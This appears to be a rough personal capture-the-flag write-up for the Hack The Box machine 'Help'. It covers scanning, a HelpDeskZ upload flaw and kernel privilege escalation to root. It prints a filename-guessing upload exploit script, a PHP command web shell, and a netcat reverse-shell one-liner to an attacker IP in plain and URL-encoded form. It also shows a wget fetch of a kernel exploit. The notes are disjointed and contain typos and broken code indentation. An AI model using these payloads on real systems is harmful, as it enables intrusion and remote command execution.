    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
so nmap reveals two ports, its running node js on an apache 2014 box, ssh seems up to date. initial go buster scans didn't give much on the serfuce but after enumerating support it revealed some more directories. 

```
# Nmap 7.70 scan initiated Mon Jan 21 19:30:29 2019 as: nmap -sC -sV -p- -Pn -T4 -oA total-help help.htb
Nmap scan report for help.htb (10.10.10.121)
Host is up (0.047s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



oh, wow, very clean and neat webpage.

 ![webpage-support](https://chickenpwny.github.io/images/help/webpage-support.PNG)		

tried uploading a php reverse shell got some kind of filtering. 

php, php5 aren't allowed. one last test for file types because captcha blows

could fuz the api which might be the easiest thing to do. like in mischief where you could bypass all that mobojumbo just by fuzzing possible functions

### Gobuster

=====================================================                                       

/index.html (Status: 200)                                                                           
/support (Status: 301)                                                                              
/javascript (Status: 301) 

#### support

=====================================================                                       

```
/images (Status: 301)                                                                               
/uploads (Status: 301) 
​	/articles (Status: 301)
​	/tickets (Status: 301)                               
/css (Status: 301)                        
/includes (Status: 301)                                   
/js (Status: 301)                                         
/views (Status: 301)
/controllers (Status: 301)
```

===================================================== 

HELPDESKZ

examining r/controllers/submit_ticket_controller.php#L160  line 137 too 165. This part of the program deals with how the webapp uploads, names, verifies file type & size. It produces an error but doesn't do anything with the uploaded file.  If its the right file type and meets the criteria it will notify send the ticket onward. 

lesson

next time even if it produces a error check and make sure the file still wasn't uploaded. 

> ```
> isset determines if a variable is set & not a NULL character. checks the error_msg the settings.
> if(!isset($error_msg) && $settings['ticket_attachment']==1){
> Now it sets the variables UPLOAD_DIR /support/uploads/ this just attaches tickets/ to the end.
> 					$uploaddir = UPLOAD_DIR.'tickets/';		
> The next if statement is dealing with how the program handles errors and uploading a ticket.
> 					if($_FILES['attachment']['error'] == 0){
> Defining variables
> ext uses the PATHINFO_EXTENSION functions which will take the extention and figure out what kind of program it is.
> 					$ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
> This names the file						
> 						$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
> This checks the uploaded file type and size
> 						$fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
> this is the full path for the uploaded path
> 						$uploadedfile = $uploaddir.$filename;
> if the uploaded file doesn't produce errors move_uploaded_file is a function that moves a file. then it anayzes the file. i think the file is uploaded regarless if the verification fails or not. 
> 						if (!move_uploaded_file($_FILES['attachment']['tmp_name'],$uploadedfile)) {
> 							$show_step2 = true;
> 							$error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
> 						}else{
> 							$fileverification = verifyAttachment($_FILES['attachment']);
> if it produces different answers it will print the text after $LANG
> 							switch($fileverification['msg_code']){
> 								case '1':
> 								$show_step2 = true;
> 								$error_msg = $LANG['INVALID_FILE_EXTENSION'];
> 								break;
> 								case '2':
> 								$show_step2 = true;
> 								$error_msg = $LANG['FILE_NOT_ALLOWED'];
> 								break;
> 								case '3':
> 								$show_step2 = true;
> 								$error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
> 								break;
> 							}
> 						}
> 					}
> ```



"Something like it. But you can shorten the range by giving it something closer to the what the server time is. If you know the server is a certain time, no need for the loop to start at 0
Right now, it is 3:25 PM for me. If I know the server time is 3:15 PM, I can safely start the loop around the 8 minute mark and stop probably around the 12 minute mark"

just a guess

the first part checks for error with captcha. uploads the directory, then proceeds to define the variables. 
ext variable defines the file extensions.PATHINFO_EXTENSION get the extension of a file if the file uses dots in the parameter name it will clean it up by returning the last extension.  php.jpg returns .jpg 

FILENAME does the md5 stuff then sets the extension with the .ext variable. 
file uploaded moves the file into the directory

the last variable UPLOADEDFILE complete path for the uploaded file.
second if statement
move_uploaded_file if the forum was completed, lang checks against other languages. ​                         

So it might produce an error it still leaves the file on the host.

Editing the rce.py 

### rce.py

 is a python script that will try and predict the name of the suploadded file by using the system time of the server computer. I had orginally thought it was a time zone thing GMT time is 8 or 12 our ahead or behind but thats not the point.   

< Date: Wed, 23 Jan 2019 18:19:57 GMT 

my time is 5 minutes off from the system clock.  5*60 = 300 just need to change the range in for x in range(250, 500): time.time() gmt time which is think is some kind of internal system clock. 

```
import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]
currentTime = int(time.time())

####for x in range(250, 500):#####

    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"

```



#### upload simple-backdoor.php

```
locate simple-backdoor.php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```

ippsec php-backdoor.php
this one didn't work fully it would just hang

<?php system($_REQUEST['CMD']) ?>

query server nodejs json

< X-Powered-By: Express
X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
Content-Type: application/json; charset=utf-8

curl -v --head help.htb:3000

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9051 >/tmp/f

url encode it either using the encoder or highlight right clicking in the repeater tab

%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%31%34%20%39%30%35%31%20%3e%2f%74%6d%70%2f%66



```bash
python -c 'import pty; pty.spawn("/bin/bash")'  
python -c 'import pty; pty.spawn("/bin/sh")'  
```

 mv /tmp/passwd.bak /etc/passwd

ROOT

HISTORY

rOOTmEoRdIE!

find / -perm 4000- type f -exec ls -ld {} \; 2>&1 | grep -v "denied"

cat /etc/cron*

grep -rnw password /

npm run build               

sudo shutdown

ps -aux | grep root

crontab -l    

 reboot                                                                                                    

help      22991  0.0  0.0  96704   872 pts/2    Sl+  11:19   0:03 ./cowroot 

find / -user root -perm -4000 -exec ls -ldb {} \; | grep -v "Permission denied"

find / -perm -u=s -type f 2>/dev/null

```
/usr/sbin/exim4
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/s-nail/s-nail-privsep
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/mount
/bin/umount
/bin/fusermount
/bin/ping

```

https://www.hackingarticles.in/hack-the-trollcave-vm-boot-to-root/

https://askubuntu.com/questions/183515/how-do-i-find-the-kernel-version-ubuntu-release-and-disk-partition-information

https://www.exploit-db.com/exploits/44298

Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 



python3 -m http.server 9058

wget http://ip_addr:9058/chicken.c

you may also copy paste by encoding the code in base64 then decoding on the host machine.

gcc chicken.c -o kernel     

chmod u+x kernel

./kernel

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambasha
re),1000(help)

